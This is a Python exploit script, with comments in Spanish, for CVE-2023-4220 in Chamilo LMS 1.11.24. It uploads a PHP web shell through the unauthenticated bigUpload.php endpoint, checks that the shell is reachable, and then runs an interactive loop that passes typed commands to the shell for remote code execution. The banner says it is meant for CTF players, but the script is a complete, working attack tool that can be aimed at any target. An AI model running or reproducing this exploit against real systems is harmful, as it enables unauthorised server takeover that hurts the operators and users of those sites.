#!/usr/bin/env python3
# PequeÃ±o Exploit para LMS Chamilo 1.11.24 CVE-2023-4220 
import sys
import requests

upload_path = "/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"
shell_path = "/main/inc/lib/javascript/bigupload/files/shell.php"

def control(shell):
    print ("Tipear \"#exit\" para salir")

    while True:
        cmd = input("[SHELL]>>> ")
        req = requests.get(shell+"?cmd="+cmd)

        if cmd == "#exit":
            break

        if req.ok:
            print (req.text)
        
        else:
            print ("Error: " + str(req.status_code))
            exit (1)

def main(target):
    files = {'bigUploadFile': open('shell.php', 'rb')}
    req = requests.post(target+upload_path, files=files)

    if req.ok:
        #Verificando si nuestra Shell se subio correctamente
        req_shell = requests.get(target+shell_path)

        if req_shell.ok:
            print ("[+] Shell subida :P\n")
            #print (target+shell_path)
            control(target+shell_path)

        else:
            print ("[-] Error al subir la Shell")
            print (str(req_shell.status_code))
    else:
        print ("[-] Error: " + str(req.status_code))

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print ("\n\t\tExploit by Alejandro Gonzales D.")
        print ("\t\t\tFor CTF Players :)")
        print ("\t\t[ CVE-2023-4220 RCE Chamilo 1.11.24 ]\n")
        
        print("{} <target>".format(sys.argv[0]))
    else:
        main(sys.argv[1])